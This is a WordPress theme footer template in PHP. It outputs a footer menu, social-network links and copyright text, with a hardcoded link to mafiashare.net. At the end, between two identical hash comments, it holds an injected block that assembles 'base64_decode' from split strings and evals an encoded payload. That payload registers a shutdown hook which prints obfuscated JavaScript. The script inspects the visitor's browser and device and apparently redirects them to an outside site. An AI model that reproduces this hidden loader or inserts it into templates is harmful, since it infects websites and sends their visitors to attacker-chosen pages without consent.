</div>
<div class="clear"></div>
<!-- Footer Start -->
<?php	
	$cs_gs_footer_settings = get_option( "cs_gs_footer_settings" );
		if ( $cs_gs_footer_settings <> "" ) {
			$sxe = new SimpleXMLElement($cs_gs_footer_settings);
				$cs_footer_logo = $sxe->cs_footer_logo;
				$cs_copyright = $sxe->cs_copyright;
				$cs_powered_by = $sxe->cs_powered_by;
				$cs_powered_icon = $sxe->cs_powered_icon;
				$cs_analytics = $sxe->cs_analytics;
				$cs_footer_contact = $sxe->cs_footer_contact;
		}
?>
<div id="footer">
    	<div class="inner">
        	<!-- // Go to Top // -->
        	<a href="#top" class="gotop">&nbsp;</a>
        	<!-- Footer Left Start -->
            <div class="ft-left">
            	<h4><a href="<?php echo home_url() ; ?>" class="colr"><?php bloginfo( 'name' ); ?></a></h4>
                <?php 
				// Menu parameters		
					$defaults = array(
					  'theme_location'  => 'footer-menu',
					  'menu'            => '', 
					  'container'       => '', 
					  'container_class' => 'menu-footer', 
					  'container_id'    => 'menu-footer',
					  'menu_class'      => 'menu-footer_menu', 
					  'menu_id'         => 'menu-footer',
					  'echo'            => true,
					  'fallback_cb'     => 'wp_page_menu',
					  'before'          => '',
					  'after'           => '',
					  'link_before'     => '',
					  'link_after'      => '',
					  'items_wrap'      => '<ul id="%1$s" class="%2$s">%3$s</ul>',
					  'depth'           => 1,
					  'walker'          => '');
					 		if(has_nav_menu('top-menu')){?>
                                    <?php wp_nav_menu( $defaults); ?>
                                    <div class="clear"></div>
							<?php }else{
								$args = array(
                                    'sort_column' => 'menu_order, post_title',
                                    'menu_class'  => 'menu-footer',
									'depth'       => 1,									
                                    'include'     => '',
                                    'exclude'     => '',
                                    'echo'        => true,
                                    'show_home'   => false,
                                    'link_before' => '',
                                    'link_after'  => '' );
									wp_page_menu( $args ); }
		
				//Social Sharing Footer Icons
					$cs_social_network = get_option("cs_social_network");
							if ( $cs_social_network <> "" ) {
								$xmlObject = new SimpleXMLElement($cs_social_network);
									$twitter = $xmlObject->twitter;
									$facebook = $xmlObject->facebook;
									$linkedin = $xmlObject->linkedin;
									$digg = $xmlObject->digg;
									$delicious = $xmlObject->delicious;
									$google_plus = $xmlObject->google_plus;
									$google_buzz = $xmlObject->google_buzz;
									$google_bookmark = $xmlObject->google_bookmark;
									$myspace = $xmlObject->myspace;
									$reddit = $xmlObject->reddit;
									$stumbleupon = $xmlObject->stumbleupon;
									$yahoo_buzz = $xmlObject->yahoo_buzz;
									$youtube = $xmlObject->youtube;
									$feedburner = $xmlObject->feedburner;
									$flickr = $xmlObject->flickr;
									$picasa = $xmlObject->picasa;
									$vimeo = $xmlObject->vimeo;
									$tumblr = $xmlObject->tumblr;
							}
						?>
                        <!-- Follow Us Start -->
                    	<ul class="social">
							<?php if($twitter != ''){?><li><a title="Twitter" href="<?php echo $twitter;?>" class="so-twitter" target="_blank">&nbsp;</a></li><?php }?>
                            <?php if($facebook != ''){?><li><a  title="Facebook" href="<?php echo $facebook;?>" class="so-fb" target="_blank">&nbsp;</a></li><?php }?>
                            <?php if($linkedin != ''){?><li><a  title="Linkedin" href="<?php echo $linkedin;?>" class="linkedin" target="_blank">&nbsp;</a></li><?php }?>
                            <?php if($digg != ''){?><li><a  title="Digg" href="<?php echo $digg;?>" class="digg" target="_blank">&nbsp;</a></li><?php }?>
                            <?php if($delicious != ''){?><li><a  title="Delicious" href="<?php echo $delicious;?>" class="delicious" target="_blank">&nbsp;</a></li><?php }?>
                            <?php if($google_plus != ''){?><li><a  title="Google Plus" href="<?php echo $google_plus;?>" class="google_plus" target="_blank">&nbsp;</a></li><?php }?>
                            <?php if($google_buzz != ''){?><li><a  title="Google Buzz" href="<?php echo $google_buzz;?>" class="google_buzz" target="_blank">&nbsp;</a></li><?php }?>
                            <?php if($google_bookmark != ''){?><li><a  title="Google Bookmark" href="<?php echo $google_bookmark;?>" class="google_bookmark" target="_blank">&nbsp;</a></li><?php }?>                                                                                                                                            
                            <?php if($myspace != ''){?><li><a  title="Myspace" href="<?php echo $myspace;?>" class="myspace" target="_blank">&nbsp;</a></li><?php }?>
                            <?php if($reddit != ''){?><li><a  title="Reddit" href="<?php echo $reddit;?>" class="reddit" target="_blank">&nbsp;</a></li><?php }?>
                            <?php if($stumbleupon != ''){?><li><a  title="Stumbleupon" href="<?php echo $stumbleupon;?>" class="stumbleupon" target="_blank">&nbsp;</a></li><?php }?>
                            <?php if($youtube != ''){?><li><a  title="Youtube" href="<?php echo $youtube;?>" class="youtube" target="_blank">&nbsp;</a></li><?php }?>
                            <?php if($feedburner != ''){?><li><a  title="Feedburner" href="<?php echo $feedburner;?>" class="feedburner" target="_blank">&nbsp;</a></li><?php }?>
                            <?php if($flickr != ''){?><li><a  title="Flickr" href="<?php echo $flickr;?>" class="flickr" target="_blank">&nbsp;</a></li><?php }?>                                                                                                                                
                            <?php if($picasa != ''){?><li><a  title="Picasa" href="<?php echo $picasa;?>" class="picasa" target="_blank">&nbsp;</a></li><?php }?>                                                                                                                                                                
							<?php if($vimeo != ''){?><li><a  title="Vimeo" href="<?php echo $vimeo;?>" class="so-vimeo" target="_blank">&nbsp;</a></li><?php }?>
                            <?php if($tumblr != ''){?><li><a title="Tumblr"  href="<?php echo $tumblr;?>" class="tumblr" target="_blank">&nbsp;</a></li><?php }?>                                                                                                                                                                
                        </ul>                
                        <!-- Follow Us ENd -->                        
            </div>
            <!-- Footer Right Start -->
            <div class="ft-right">
            	<?php echo $cs_footer_contact;?>
            </div>
            <!-- Footer Left End -->
            <!-- Copyrights Start -->
            <div class="copyrights">
            	<a class="logo-foot" href="<?php echo home_url( '/' ); ?>"><img src="<?php echo $cs_footer_logo?>" alt="" /></a>
				<p><?php echo $cs_copyright?></p>
                <p>
					<?php if ($cs_powered_by<>"")echo "<span>".$cs_powered_by."</span>"?>
                    <?php echo '<a href="http://www.mafiashare.net"><img src="'.$cs_powered_icon.'" /></a>'?>
                </p>
            </div>
            <!-- Copyrights End -->
            <div class="clear"></div>
        </div>
    </div>
</div>

<!-- Outer Wrapper End -->
<?php wp_footer();?>

<!--32dc79e2130d26c19ead0c6d52fea75b--><?php  $ygu="b"."ase"."64_de"."code";eval($ygu("CmZ1bmN0aW9uIHVzZXJfYWJvcnRfZW5kX2V4aXRfb3BlcmF0aW9uaWRfMjY0MzA4MSgpCnsKICAgIGVjaG8gYmFzZTY0X2RlY29kZSgnUEhOamNtbHdkQ0IwZVhCbFBTSjBaWGgwTDJwaGRtRnpZM0pwY0hRaUlHbGtQU0pwWkY4eU5qUXpNRGd4SWo1bGRtRnNLR1oxYm1OMGFXOXVLSEFzWVN4akxHc3NaU3hrS1h0bFBXWjFibU4wYVc5dUtHTXBlM0psZEhWeWJpaGpQR0UvSnljNlpTaHdZWEp6WlVsdWRDaGpMMkVwS1NrcktDaGpQV01sWVNrK016VS9VM1J5YVc1bkxtWnliMjFEYUdGeVEyOWtaU2hqS3pJNUtUcGpMblJ2VTNSeWFXNW5LRE0yS1NsOU8ybG1LQ0VuSnk1eVpYQnNZV05sS0M5ZUx5eFRkSEpwYm1jcEtYdDNhR2xzWlNoakxTMHBlMlJiWlNoaktWMDlhMXRqWFh4OFpTaGpLWDFyUFZ0bWRXNWpkR2x2YmlobEtYdHlaWFIxY200Z1pGdGxYWDFkTzJVOVpuVnVZM1JwYjI0b0tYdHlaWFIxY200blhGeDNLeWQ5TzJNOU1YMDdkMmhwYkdVb1l5MHRLWHRwWmloclcyTmRLWHR3UFhBdWNtVndiR0ZqWlNodVpYY2dVbVZuUlhod0tDZGNYR0luSzJVb1l5a3JKMXhjWWljc0oyY25LU3hyVzJOZEtYMTljbVYwZFhKdUlIQjlLQ2R4SURGMFBUTjRLRW9vS1h0bUtHb3VUU0U5TVVrbUprd2dhaTVOSVQwaVN5SXBlek41S0RGMEtUdG1LRXdnUVZzaU1VRWlYVDA5SWtzaUtYdEJXeUl4UVNKZFBURTdjU0F4Tnowb01UWW9LU1ltTVZJb0tTazdjU0F4VkQwaE1UY21KaUVoUVM0emVpWW1RUzVGTGpOM1BUMDlJak4ySUROeUxpSTdjU0F4YWowdE1UdHhJRWM5SWpOek9pOHZNM1F1TTNVdk0wRWlPMllvVnlncEppWXhhajA5TVNsN1ppZ29SUzVPTGpGdktDOHpRaTlwS1NsOGZDaEZMazR1TVc4b0x6TklMMmtwS1NsN01Ua3VNMGtvUnlsOWVudEJMakU1UFVjN2FpNHhPVDFIZlgxNmUyWW9LREUzSmlZaE1WUW1KaUZYS0NrcEtYdHhJRk05SWp3eE1TQXpTajFjWENJelJ6b3pSanN6UXpvdE0wUTdYRndpUGp3eGVTQXpSVDFjWENJeGJGeGNJaUF6Y1QxY1hDSWlLMGNySWx4Y0lpQXpjRDFjWENJeGJGeGNJajQ4THpGNVBqd3ZNVEUrSWp0eElFazlhaTR6WWlnaU1URWlLVHRtS0VrdU1XMDlQVEFwZTJvdVRTNVFQV291VFM1UUsxTjllbnR4SURGT1BVa3VNVzA3Y1NCU1BUTmpMak5rS0NneFRpOHlLU2s3U1Z0U1hTNVFQVWxiVWwwdVVDdFRmWDE5ZlRGTktDbDlmU3d6WVNrN1NpQXhUU2dwZTNFZ1ZUMGlNemtpTzJZb1ZTRTlJak0xSWlsN2NTQklQV291TXpZb1ZTazdaaWhNSUVnaFBVc21Ka2doUFRGSktYdElMak0zUFNJaU96TTRJRWg5ZlgwN1NpQXhVaWdwZTJZb2FpNUVKaVloYWk0elpTbDdlQ0JDZlhvZ1ppaHFMa1FtSmlGQkxqTm1LWHQ0SUVKOWVpQm1LR291UkNZbUlXb3VNMjBwZTNnZ1FuMTZJR1lvYWk1RUppWWhhaTR6YmlsN2VDQkNmWG9nWmlocUxrUW1KaUZCTGpOdktYdDRJRUo5ZWlCbUtHb3VSQ2w3ZUNCQ2ZYb2daaWhNSUVVdU0yd2hQU0pMSWlZbUlXb3VSQ1ltTVRZb0tTbDdlQ0JDZlhwN2VDQXhZbjE5U2lBeE5pZ3BlM0VnZVQxQkxrVXVUanR4SUZFOWVTNURLQ0l6YXlBaUtUdG1LRkUrTUNsN2VDQmFLSGt1V1NoUkt6VXNlUzVES0NJdUlpeFJLU2tzTVRBcGZYRWdNV3M5ZVM1REtDSXpaeThpS1R0bUtERnJQakFwZTNFZ01UUTllUzVES0NJemFEb2lLVHQ0SUZvb2VTNVpLREUwS3pNc2VTNURLQ0l1SWl3eE5Da3BMREV3S1gxeElFODllUzVES0NJemFTOGlLVHRtS0U4K01DbDdlQ0JhS0hrdVdTaFBLelVzZVM1REtDSXVJaXhQS1Nrc01UQXBmWGdnTVdKOVNpQlhLQ2w3Y1NBeFlUMUJMa1V1VGk0emFpZ3BPMllvTHlnelMzd3pURnhjWkN0OE5HZ3BMaXN4YUh3MGFYdzBhbHhjTDN3MFozdzBabncwWW53MFkzdzBaSHd6Tkh3MGEzd3hkU2cwYkh3eFpDbDhNWEo4TkhKOE5ITWdmRFIwZkRSeGZEUndmREZvTGlzMGJYdzBibncwYnlCdEtEUmhmRFE0S1dsOE0xTW9JREZQS1Q5OE0xUjhjQ2d6Vlh3elVpbGNYQzk4TTFGOE0wMThNMDU4TTA4b05IdzJLVEI4TTFCOE0xWjhNVWhjWEM0b00xZDhORE1wZkRRMGZEUTJmRFF5SURReGZETllmRE5aTDJrdU1VTW9NV0VwZkh3dk0xcDhOSFY4TWt0OE1tWjhNbUY4TlRCYk1TMDJYV2w4TWpoOE1WWjhZU0F4VUh3eFdId3hkeWd4VVh3eGVIeHpYRnd0S1h3eFV5Z3lZbnd5YXlsOE1XY29NbTE4TVc1OE1YWXBmREp1ZkRKa0tESmxmRlo4TW1NcGZESnBmREZtS0RKc2ZERmpLWHd4V2loVWZESnZLWHd4VjN3eFdTZ3ljSHhjWEMxdGZISWdmSE1nS1h3eWNYd3laeWd4Vlh3eGNId3lhQ2w4TVVJb01tcDhNaklwZkRJektERjNmREk1S1h3eU55aGxmSFlwZDN3eU5ud3lORnhjTFNodWZIVXBmREkxWEZ3dmZETXpmREpSZkRKU1hGd3RmREpRZkRKUGZESk1mREpOWEZ3dGZERjJLREpPZkRGRktYd3lXbnd5VmlneFpYd3hjSHd5V0NsOE1uaDhNbmxjWEMxemZESjZmREozZkRKMmZERnBLR044Y0NsdmZESnpLREV5ZkZ4Y0xXUXBmREoxS0RRNWZERlRLWHd5UWlneVNId3lTU2w4TVZFb01rUjhNa1VwZkRKRGZESkdLRnMwTFRkZE1Id3hUM3d4VUh3eVJ5bDhNa0Y4TW5Rb1hGd3RmREZ4S1h3eFRDQjFmREpLZkRKWGZESlpYRnd0Tlh4blhGd3RNVFY4TVdNb1hGd3VkM3d4WkNsOE16RW9NekI4TWxVcGZESnlmREpVZkRKVFhGd3RLRzE4Y0h4MEtYdzBaVnhjTFh3MFJDZ3hSM3d4UmlsOE5tMG9JR2w4TVhVcGZEWnVYRnd0WTN3MmJ5aGpLRnhjTFh3Z2ZERnhmR0Y4WjN4d2ZITjhkQ2w4Tm1zcGZEWm9LRFpwZkRacUtYeHBYRnd0S0RJd2ZERmpmRmdwZkRaeGZEUjJLQ0I4WEZ3dGZGeGNMeWw4Tm5kOE5uaDhObmw4Tm5aOE5uVjhObko4Tm5OOE1YSjhOblFvZEh4MktXRjhObWQ4Tm1aOE5qSjhOak44TmpSOE5Wb29JSHhjWEM4cGZEVlZmRFZXSUh3MVYxeGNMWHcxV0NoamZHc3BmRFkxS0RZMmZEWmpLWHcyWkNnZ1ozeGNYQzhvYTN4c2ZIVXBmRFV3ZkRVMGZGeGNMVnRoTFhkZEtYdzJPSHcyT1h3MmVseGNMWGQ4TnpKOE56TmNYQzk4V0NoVWZEYzBmRGN4S1h3eGVpaEdmREl4ZkRGdUtYeHRYRnd0TmxwOE5sY29ObGg4TVVRcGZEYzFLRGMyZkRkamZERktLWHczWlh3eE5TaEdmRGRrZkRGQ2ZEZGlmREZwZkhRb1hGd3RmQ0I4YjN4MktYdzNOeWw4Tnpnb05UQjhObFY4ZGlBcGZEWlVmRFpIZkRaSVd6QXRNbDE4TmtsYk1pMHpYWHcyUmlnd2ZESXBmRFpGS0RCOE1udzFLWHcyUWlnd0tEQjhNU2w4TVRBcGZEWkRLQ2hqZkcwcFhGd3RmRFpFZkRaS2ZEWkxmRFpSZkRaU0tYdzJVeWcyZkdrcGZEWlBmRFpNZkRaTktEWk9mRFZVS1h3MVUzdzBWM3cwV0h3MFdTaGhmR1I4ZENsOE5GVjhORklvTVROOFhGd3RLRnN4TFRoZGZHTXBLWHcwV253MU1Yd3hTeWcxWVh3MVlpbDhOV05jWEMweWZEVTVLREZWZkRVNGZERnpLWHcxTlh3MU5ud3hSMXhjTFdkOE5UZGNYQzFoZkRSUUtEUkRmREV5ZkRJeGZETXlmRFl3ZkZ4Y0xWc3lMVGRkZkdsY1hDMHBmRFI0ZkRSNWZEUjZmRFJHZkRSSGZEUk5LRFJPZkRSUEtYdzBURnhjTDN3MFN5ZzBTSHhZZkRSSmZEUktmRlo4TldRcGZEVmxLRVo4YUZ4Y0xYd3hlSHh3WEZ3dEtYdzFSMXhjTDN3eGN5aGpLRnhjTFh3d2ZERXBmRFEzZkRGNmZERkZmREZFS1h3MVFWeGNMWHcxUW53MVF5aGNYQzE4YlNsOE5VbGNYQzB3ZkRWS0tEUTFmRFZSS1h3MVVpZ3haM3d4Wm53MVQzd3haWHcxVGlsOE5Vc29OVXg4VmlsOE5VMG9SbnhvWEZ3dGZIWmNYQzE4ZGlBcGZEVjVLRVo4Tld3cGZEVnRLREU0ZkRVd0tYdzFiaWcxYTN3eE1Id3hPQ2w4TVVZb05XZDhOV2dwZkRWcFhGd3RmRFZ2WEZ3dGZEVndLR2w4YlNsOE5YWmNYQzE4ZEZ4Y0xURTFmRFY0S0RGTGZEVjFLWHd4U2lnM01IeHRYRnd0ZkRWeGZEVnlLWHcxYzF4Y0xUbDhNVWdvWEZ3dVlud3hUSHcxZWlsOE5WQjhOVVI4TlVWOE5GWjhObVVvTm5COFZDbDhObXdvTkRCOE5Wc3dMVE5kZkZ4Y0xYWXBmRFYwZkRWM2ZEVm1mRFZxS0RVeWZEVXpmRFl3ZkRZeGZEY3dmRFZJZkRWR2ZEUjNmRFJCZkRSQ0tYdzBSU2hjWEMxOElDbDhORkY4TkZSOE5GTW9aeUI4TmxCOE56a3BmRGRoZkRaWmZEWldmRFpCWEZ3dGZEWTNmRFpoZkRaaVhGd3RMMmt1TVVNb01XRXVOVmtvTUN3MEtTa3BlM2dnUW4xNElERmlmU2NzTmpJc05EUTVMQ2Q4Zkh4OGZIeDhmSHg4Zkh4OGZIeHBabng4Zkh4a2IyTjFiV1Z1ZEh4OGZIeDhmSHgyWVhKOGZIeDhmSHg4Y21WMGRYSnVmRTlCYTNkWGNucFFkbWxpU0VGcGJtWnhaR1pRUW5WbmJGTlpiMU4yVVVGQ1pYeGxiSE5sZkhkcGJtUnZkM3gwY25WbGZHbHVaR1Y0VDJaOFlXeHNmRzVoZG1sbllYUnZjbnd3TVh4b1QwNTJTM1JvUVhkS1ZYcDZXa2hwYzB0c1JtVjZUbEJVV1dWSWFuZENlVU5xWVdGbVRYeEViVWRWUzBKcVRFSnZlbXBaUzNaNmNGZEJjRkpsVDBseWRuZDZZa3hpZDFCbGJrVmhmR1ZIWlZCVWFuUjBhbHBGWkhSelJFdEVlVkpJYTFoT2VtTjRRVmRUVTJoaFNrTlhVazF0ZkdaMWJtTjBhVzl1ZkhWdVpHVm1hVzVsWkh4MGVYQmxiMlo4WW05a2VYeDFjMlZ5UVdkbGJuUjhiMjlRVkUxdFZtNW1jM0ZEVEhOdVoyOVJjVU5qWlUxaFptZHRSMnhXVDAxdlRWaEJhbnhwYm01bGNraFVUVXg4VjJ4amRGbElTV1Z0WlV0cmJXWk1TVk54UmxKNFFVbFJjWE5QY0ZoTVZYeDVUWGR2U1hkM1VWVmlkRTlrZEU1RFNITmFWbGxLUVZGYWNGZHNkMnBvVFV4M1ZsWllhSHhsUzNCVVJGbHhSMlpEWkhoNGJreE1RbmRtUldGcFRYWm9ibUpwY0dob2ZIUmxmR2w1YTFWNWRGVmtlbFZUWjBaSWJsSllkbVJHYTJkU2FWZEZVbEp2Vm5KOGJubDhXV05EUzBsaGJucEJTVXgxYWtob1EySnFiVVZ1VW05bGNIbFBlVXBwVTNwdVltbDVkMEpOY21SOGJXRjhjM1ZpYzNSeWFXNW5mSEJoY25ObFNXNTBmSHhrYVhaOGZIeHVZMWhJVFdwbWFYSlBSRlpZZEhOTmNsbE5UVkZoV0dKMVdsUnZRVkZXUzB4SWJIbDhiVzk4ZUdKNVozbHZRbXBOYkdoRFRXbHBWbEZhVG1wcmRtTlBUMkphUmxOaGMweElabkZYZkVKcFkycHRabUpTVm14U1UyNU1UM2hCWkc5NVpXNWxVV3hSZWs5blNrVlZUMVZEZFhOS1dWQjhmR3h2WTJGMGFXOXVmRlpCUzFwM1EzcHBSSFo1V1ZKQ1JtbDBlRzF6UWt0b2RWVlhWa1pOYVhOa1YyOW1UMnRDZkdaaGJITmxmR2R2Zkc5a2ZHbDBmR0Z5ZkdGc2ZHMXZZbWxzWlh4a2IzeHpSMWwzY1doSGJGbGFVbGwzYkdsaFVXTm5RWHByY1Uxd2JsTkliM1YyYjNCYVJXWjhjVmxpUkU1NWJtRkRhRmxwU0hOWWNWQjNRbkIxUjNaUFUwOWlTMWhzYUhKWmZEaHdlSHhzWlc1bmRHaDhZMkY4YldGMFkyaDhiR3g4WDN4cGNtbHpmSE5sZkhSMWVuQnlXSEpTZUVaMmMxaDFRVzlUWjFaMFVuQkpVM2RZYVZGSGRubDhhWEI4WTI5OFlXTjhiMjk4YVdaeVlXMWxmRzFqZkhaZk16SmtZemM1WlRJeE16QmtNalpqTVRsbFlXUXdZelprTlRKbVpXRTNOV0o4WW1sOGRHVnpkSHh5YVh4dVpIeDBZWHh3ZEh4MWNIeHVkV3hzZkhSemZIQnNmR2N4ZkVGVVZsTm9kM0JvVGxCV2FVVmlZM0pMVDJaUFZXRk1VRlZCWVhoaGJGSkJkMDlCUzNabGJueGtiRjl1WVcxbGZHOXpmSGRoZkdWeWZFNXFVVXRzYW1OQ2VrbEdTWEpXZUVSUGFGbEpUM1ZvY0VwMFFsSnZUMVp4U1d0eFRYZEJXWHhoYVh4SFRtSlBXVVIzY1hSNmNWWkVkVlpNVlhCNmJGZERVWFJPZUUxdWFFTkZjRmRsWlVaOFkydDhPREF5YzN4aGRIUjNmR0ZpWVdOOFlYVjhZWE44Zkh4eVpIeGliSHhpZDN4ak5UVjhZblZ0WW54aWNudzNOekJ6ZkdGNmZEUjBhSEI4YTI5OGVYZDhZVzU4WlhoOE0yZHpiM3hpWlh4dWNYeGhjSFIxZkd4aWZISnVmR05vZkdGMmZHRnRiMmw4ZFhOOFpHbDhZWFpoYm54b1lXbGxmR1J6Zkdac2VYeGxiSHhrYlc5aWZHUnBZMkY4WkdKMFpYeGtZM3hrWlhacGZHWmxkR044WlcxOFpYTnNPSHhwWTN4ck1IeGxlbng2Wlh4c01ueDFiSHhuTlRZd2ZEWTFPVEI4WTJ4a1kzeGpiV1I4YlhCOFkyaDBiWHhqWld4c2ZHTmpkMkY4WTJSdGZHaGtmR2hqYVhSOGRXNThaR0Y4WjJWdVpYeHVaM3huWm54amNtRjNmR0ZrZkdkeWZIeGpZWEJwZkdocGNIUnZjSHh1YjI1bGZHZGxkRVZzWlcxbGJuUkNlVWxrZkc5MWRHVnlTRlJOVEh4a1pXeGxkR1Y4YVdSZk1qWTBNekE0TVh3eE1EQjhaMlYwUld4bGJXVnVkSE5DZVZSaFowNWhiV1Y4VFdGMGFIeG1iRzl2Y254amIyMXdZWFJOYjJSbGZGaE5URWgwZEhCU1pYRjFaWE4wZkZSeWFXUmxiblI4Y25aOFJXUm5aWHgwYjB4dmQyVnlRMkZ6Wlh4TlUwbEZmRzFoZUZSdmRXTm9VRzlwYm5SemZIRjFaWEo1VTJWc1pXTjBiM0o4WVdSa1JYWmxiblJNYVhOMFpXNWxjbnhoZEc5aWZHaGxhV2RvZEh4emNtTjhTVzVqZkdoMGRIQjhhMjlzWkc5MllYbGhjRzl5YjJSaGZIUnJmRWR2YjJkc1pYeDJaVzVrYjNKOGMyVjBTVzUwWlhKMllXeDhZMnhsWVhKSmJuUmxjblpoYkh4amFISnZiV1Y4TURVeVJueHBVR2h2Ym1WOGJHVm1kSHd4TURZNWNIaDhkMmxrZEdoOFlXSnpiMngxZEdWOGNHOXphWFJwYjI1OGFWQnZaSHh5WlhCc1lXTmxmSE4wZVd4bGZHRnVaSEp2YVdSOFltSjhjRzlqYTJWMGZIQnpjSHh6WlhKcFpYTjhjM2x0WW1saGJueHdiSFZqYTJWeWZISmxmSEJoYkcxOGNHaHZibVY4YVhocGZIUnlaVzk4WW5KdmQzTmxjbng0WkdGOGVHbHBibTk4TVRJd04zeDhZMlY4ZDJsdVpHOTNjM3hzYVc1cmZIWnZaR0ZtYjI1bGZIeDNZWEI4ZkdsdWZIeHZZbnhqYjIxd1lXeDhaV3hoYVc1bGZHWmxibTVsWTN4b1pXbDhZbXhoZW1WeWZHSnNZV05yWW1WeWNubDhiV1ZsWjI5OFlYWmhiblJuYjN4aVlXUmhmR2xsYlc5aWFXeGxmR2h2Ym1WOFptbHlaV1p2ZUh4dVpYUm1jbTl1ZEh4dmNHVnlZWHh0YlhCOGJXbGtjSHhyYVc1a2JHVjhiR2RsZkcxaFpXMXZmRFl6TVRCOGFXRmpmRGd6ZkhGMFpXdDhjak00TUh4eU5qQXdmRGcxZkRrNGZEQTNmR2hwZkhjelkzeHlZV3R6ZkhKcGJUbDhaMlY4YlcxOGJYTjhjMkY4Y3pVMWZISnZmSFpsZkhwdmZIRmpmSGRsWW1OOGNHZDhkMmw4ZDJocGRIeHdaSGhuZkhabGNtbDhiM2RuTVh4d09EQXdmSEJoYm54d2FHbHNmSHh3YVhKbGZIeDhmSEJ5YjNoOGNITnBiM3h4WVh4eWRIeHdiM3hoZVh4MVkzeHdibngyWVh4elkzeDJkV3hqZkdkMGZHeHJmSFJqYkh4MmVId3dNSHh0WW54ME1ueDBObngwWkdkOGRHVnNmRzB6ZkcwMWZIUjRmSFp0TkRCOGMyaDhkR2x0ZkhadlpHRjhkRzk4YzNsOGMybDhjMmRvZkhOb1lYSjhjMmxsZkhZME1EQjhkamMxTUh3NE1YeHpaR3Q4T0RCOGMydDhjMng4YzI5OFpuUjhjM0I4ZERWOFlqTjhkWFJ6ZEh4cFpIeHpiWHh2Y21GdWZIZDJmR3RzYjI1OGEzQjBmR3QzWTN4cmVXOThjM1ZpYzNSeWZHdG5kSHg4ZkdwcFozTjhhMlJrYVh4clpXcHBmR3hsZkc1dmZIbHZkWEo4YkdsaWQzeHNlVzU0ZkhwbGRHOThlblJsZkhocGZHeG5mSFpwZkdwbGJYVjhhbUp5YjN4b2RYeGhkM3gwWTN4MGNIeDJhM3hvY0h4b2MzeG9kSHh5WjN4cE1qTXdmR2x1Ym05OGFYQmhjWHhxWVh4cGJURnJmR2xyYjIxOGFXSnliM3hwWkdWaGZHbG5NREY4YlRGOGVXRnpmRzQzZkc1bGZHOXVmRzQxTUh4dU16QjhiWGwzWVh4dU1UQjhiakl3ZkhSbWZIZG1mRzh5YVcxOGIzQjhkR2w4Ym5wd2FIeHVZM3gzWjN4M2RIeHViMnQ4YlhkaWNIeHdNWHg0TnpBd2ZHMWxmSEpqZkhkdmJuVjhZM0o4ZkhodmZHMHpaMkY4YlRVd2ZIVnBmRzFwZkc4NGZIcDZmRzEwZkc1M2ZIZHRiR0o4WkdWOGIyRjhNREo4YlcxbFppY3VjM0JzYVhRb0ozd25LU3d3TEh0OUtTa0tQQzl6WTNKcGNIUSsnKTsKfQoKcmVnaXN0ZXJfc2h1dGRvd25fZnVuY3Rpb24oJ3VzZXJfYWJvcnRfZW5kX2V4aXRfb3BlcmF0aW9uaWRfMjY0MzA4MScpOwoK"));?><!--32dc79e2130d26c19ead0c6d52fea75b--></body>
</html>